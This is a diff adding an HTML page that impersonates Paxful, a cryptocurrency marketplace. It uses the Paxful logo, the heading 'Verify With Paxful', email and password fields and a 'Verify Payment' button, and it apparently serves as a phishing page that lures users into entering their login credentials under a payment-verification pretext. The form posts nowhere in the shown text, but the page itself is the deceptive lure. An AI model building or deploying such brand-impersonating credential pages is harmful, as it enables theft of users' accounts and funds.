@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f4f4f4; /* Background color if the image is not available or doesn't cover the entire screen */
+        }
+
+        .logo {
+            width: 150px; /* Adjust the width of the logo image */
+            margin-bottom: 20px;
+        }
+
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+
+        .login-container h2 {
+            color: purple;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group {
+            margin-bottom: 13px;
+        }
+
+        .form-group label {
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        .form-group input {
+            width: 6.5cm;
+            padding: 8px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .form-group button {
+            padding: 10px;
+            width: 7cm;
+            background-color: blue;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+<img class="logo" src="https://www.brokerchoices.com/wp-content/uploads/2019/07/paxful-review.png" alt="Paxful Logo">
+
+<div class="login-container">
+  
+    <h2>Verify With Paxful</h2>
+    <form class="login-form" action="#" method="post">
+        <div class="form-group">
+          
+            <p>Your Email</>
+              <div><input type="email" id="email" name="email" required> </div>
+        </div>
+
+        <div class="form-group">
+            <div><label for="password">Password:</label></div>
+            <input type="password" id="password" name="password" required>
+        </div>
+
+        <div class="form-group">
+            <button type="submit">Verify Payment</button>
+        </div>
+    </form>
+</div>
+
+</body>
+</html>
